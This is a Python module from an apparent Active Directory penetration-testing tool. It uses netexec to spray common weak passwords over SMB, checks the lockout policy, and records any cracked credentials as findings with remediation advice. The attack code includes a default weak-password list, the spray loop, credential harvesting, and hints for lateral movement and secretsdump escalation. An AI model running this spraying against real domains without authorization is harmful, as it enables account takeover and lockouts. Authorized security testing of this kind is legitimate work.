"""Password spraying (opt-in, aktif) — netexec tabanlı, KİLİTLENME-FARKINDA.

Spraying: tek bir parolayı tüm kullanıcılarda dener; bu, her hesap için en fazla
bir başarısız giriş üretir. Birden çok parola denenecekse, denenen parola sayısı
domain'in 'account lockout threshold' değerinin altında tutulmalıdır — aksi halde
tüm domain kilitlenir (kullanıcıya hizmet kesintisi = DoS).

Bu modül önce parola politikasını okur, güvenli parola sayısını hesaplar ve
eşiği aşacaksa `--spray-force` verilmedikçe spray'i YAPMAZ.

Yalnızca yazılı test izni olan ortamlarda kullanın.
"""

from __future__ import annotations

import os
import re
import tempfile
import time

from .. import config
from ..findings import Credential, Finding, ScanReport, Severity
from ..registry import ScanContext, ScanModule
from ..runner import CommandResult, run, strip_dryrun
from . import nxc_scan

# Autopilot için yaygın zayıf parolalar (lockout-aware motor güvenli sayıya kırpar)
DEFAULT_SPRAY_PASSWORDS = [
    "123456", "12345678", "123456789", "Password1", "Password123",
    "Welcome1", "Summer2024", "Winter2024", "Sirket2024!", "Qwerty123",
]

# Kilitlenme eşiğini okuyamazsak varsayılan güvenli tavan
_DEFAULT_SAFE_MAX = 2
# Eşiğin altında bırakılacak güvenlik payı (eşik - MARGIN kadar parola denenir)
_LOCKOUT_MARGIN = 1


def parse_lockout_threshold(text: str) -> int | None:
    """Parola politikası çıktısından kilitleme eşiğini (deneme sayısı) çıkarır.

    None  -> okunamadı
    0     -> kilitleme kapalı (eşik yok), güvenle sınırsız denenebilir
    N>0   -> N başarısız denemede hesap kilitlenir
    """
    m = re.search(
        r"Account Lockout Threshold:\s*(None|Disabled|\d+)", text, re.IGNORECASE
    )
    if not m:
        return None
    val = m.group(1).lower()
    if val in ("none", "disabled"):
        return 0
    return int(val)


def safe_password_count(threshold: int | None) -> int:
    """Kilitlenmeden güvenle denenebilecek parola sayısı."""
    if threshold is None:
        return _DEFAULT_SAFE_MAX  # politika okunamadı -> temkinli davran
    if threshold == 0:
        return 10_000  # kilitleme kapalı -> pratikte sınırsız
    return max(0, threshold - _LOCKOUT_MARGIN)


def _collect_users(ctx: ScanContext) -> list[str]:
    users: list[str] = []
    if ctx.spray_users:
        users += [u.strip() for u in ctx.spray_users if u.strip()]
    if ctx.spray_userlist and os.path.isfile(ctx.spray_userlist):
        with open(ctx.spray_userlist, encoding="utf-8", errors="replace") as fh:
            users += [ln.strip() for ln in fh if ln.strip()]
    # "Ad Soyad" listesinden olası sAMAccountName'leri türet (OSINT -> spray)
    if ctx.spray_namelist and os.path.isfile(ctx.spray_namelist):
        from .. import usergen
        users += usergen.generate(usergen.load_names(ctx.spray_namelist))
    # tekrarı koru-sırayı koruyarak temizle
    seen: set[str] = set()
    out = []
    for u in users:
        if u not in seen:
            seen.add(u)
            out.append(u)
    return out


def _run(ctx: ScanContext) -> list[CommandResult]:
    passwords = ctx.spray_passwords or []
    users = _collect_users(ctx)
    bin_name = nxc_scan.tool().name

    # 1) Parola politikasını oku (kilitlenme güvenliği için)
    passpol_argv = [bin_name, "smb", ctx.target, "-u", users[0] if users else "", "-p", "", "--pass-pol"]
    passpol = run(passpol_argv, tool="spray:pass-pol", timeout=ctx.timeout, dry_run=ctx.dry_run)
    results = [passpol]

    if ctx.dry_run:
        # Sadece ne yapılacağını göster
        for pw in passwords:
            results.append(
                run([bin_name, "smb", ctx.target, "-u", "<userlist>", "-p", pw,
                     "--continue-on-success"],
                    tool="spray:attempt", timeout=ctx.timeout, dry_run=True)
            )
        return results

    if not users or not passwords:
        results.append(CommandResult(
            tool="spray:skip", argv=[], returncode=None, stdout="",
            stderr="", duration=0.0,
            error="kullanıcı listesi veya parola verilmedi"))
        return results

    # 2) Kilitlenme güvenlik kontrolü
    threshold = parse_lockout_threshold(passpol.combined)
    safe_max = safe_password_count(threshold)
    if len(passwords) > safe_max and not ctx.spray_force:
        results.append(CommandResult(
            tool="spray:aborted", argv=[], returncode=None, stdout="",
            stderr="", duration=0.0,
            error=(
                f"GÜVENLİK: {len(passwords)} parola denenecekti ama kilitleme eşiği "
                f"{threshold} (güvenli üst sınır {safe_max}). Hesapların kilitlenmemesi "
                f"için iptal edildi. Bilerek devam etmek için --spray-force kullanın.")))
        return results

    # 3) Kullanıcı listesini geçici dosyaya yaz
    tmp = tempfile.NamedTemporaryFile("w", suffix=".txt", delete=False, encoding="utf-8")
    try:
        tmp.write("\n".join(users))
        tmp.close()
        # 4) Her parolayı TÜM kullanıcılarda dene (parola başına 1 başarısız giriş)
        for i, pw in enumerate(passwords):
            argv = [bin_name, "smb", ctx.target, "-u", tmp.name, "-p", pw,
                    "--continue-on-success"]
            results.append(run(argv, tool=f"spray:pw{i}", timeout=ctx.timeout))
            if ctx.spray_delay and i < len(passwords) - 1:
                time.sleep(ctx.spray_delay)
    finally:
        try:
            os.unlink(tmp.name)
        except OSError:
            pass
    return results


# Başarılı giriş satırı: "[+] domain\user:password" (sonunda (Pwn3d!) olabilir)
_SUCCESS_RX = re.compile(r"\[\+\]\s+([^\s\\]+)\\([^\s:]+):(\S+?)(?:\s+\(Pwn3d!\))?\s*$",
                         re.MULTILINE)


def parse(results: list[CommandResult], report: ScanReport) -> None:
    report.raw_outputs["spray"] = "\n\n".join(r.combined for r in results)
    combined = strip_dryrun("\n\n".join(r.combined for r in results))
    target = report.target

    # İptal/atlama durumlarını bulgu/uyarı olarak yansıt
    for r in results:
        if r.tool in ("spray:aborted", "spray:skip") and r.error:
            report.add_error(f"spray: {r.error}")
            if r.tool == "spray:aborted":
                report.add(Finding(
                    title="Password spraying güvenlik nedeniyle iptal edildi",
                    severity=Severity.INFO, target=target, source="spray",
                    description=r.error,
                    remediation="Daha az parola deneyin veya kilitleme penceresini bekleyin."))
            return

    # Başarılı kimlikleri topla (kullanıcı -> parola) + credential store'a ekle
    valid: dict[str, str] = {}
    valid_dom: dict[str, str] = {}
    pwned = False
    for m in _SUCCESS_RX.finditer(combined):
        dom, user, pw = m.group(1), m.group(2), m.group(3)
        is_admin = m.group(0).strip().endswith("(Pwn3d!)")
        if user.lower() not in valid:
            valid[user.lower()] = pw
            valid_dom[user.lower()] = dom
            report.add_credential(Credential(
                username=user, secret=pw, kind="password", domain=dom,
                source="spray", host=target, admin=is_admin))
        if is_admin:
            pwned = True
    if "(Pwn3d!)" in combined:
        pwned = True

    # Denenen kullanıcı sayısı (kaba): başarılı + başarısız satırlardan türet zor;
    # bunun yerine ham çıktıdaki benzersiz "domain\user" sayısını say.
    tested = len({m.group(1).lower()
                  for m in re.finditer(r"[^\s\\]+\\([^\s:]+):", combined)})
    tested = max(tested, len(valid))

    if valid:
        pct = (len(valid) / tested * 100) if tested else 0.0
        sev = Severity.CRITICAL if (pwned or pct >= 25) else Severity.HIGH
        # Kanıt: parolaları göstermeden kullanıcı + kullanılan parola sayımı
        by_pw: dict[str, int] = {}
        for pw in valid.values():
            by_pw[pw] = by_pw.get(pw, 0) + 1
        pw_summary = ", ".join(f"'{pw}': {n} hesap"
                               for pw, n in sorted(by_pw.items(), key=lambda x: -x[1]))
        # Kanıt: redact kapalıysa açık user:password çiftleri, açıksa sadece sayım
        if config.REDACT:
            creds_block = f"Örnek hesaplar: {', '.join(list(valid)[:15])}"
        else:
            creds_block = "Doğrulanan kimlikler:\n" + "\n".join(
                f"  {valid_dom[u]}\\{u}:{valid[u]}" for u in valid)
        report.add(Finding(
            title=f"Zayıf parolalarla {len(valid)} hesap doğrulandı "
                  f"(%{pct:.1f}, {tested} denendi)",
            severity=sev, target=target, source="spray",
            description="Password spraying ile geçerli kimlik bilgileri bulundu. "
                        "Bu kimlikler yanal hareket ve yetki yükseltme için kullanılabilir."
                        + (" En az bir hesapta yerel admin (Pwn3d!)." if pwned else ""),
            evidence=f"Kırılan parola dağılımı: {pw_summary}\n{creds_block}",
            remediation="Parola politikasını güçlendirin (uzunluk + karmaşıklık), "
                        "yaygın parola engelleme (Azure AD Password Protection / banned list), "
                        "etkilenen hesapları sıfırlayın, MFA uygulayın.",
            reference="Password Spraying / weak-password",
            poc=f"nxc smb {target} -u <user> -p <bulunan_parola>   # tek hesabı doğrula",
            escalation=f"Yanal hareket: 'adscan {target} --reuse --reuse-targets <CIDR>' ile "
                       "bu kimlikleri tüm host'larda dene; admin bulunursa secretsdump -> DA."))


MODULE = ScanModule(
    name="spray",
    label="password spraying (kilitlenme-farkında, opt-in)",
    run=_run,
    parse=parse,
    optin=True,
    active=True,
)
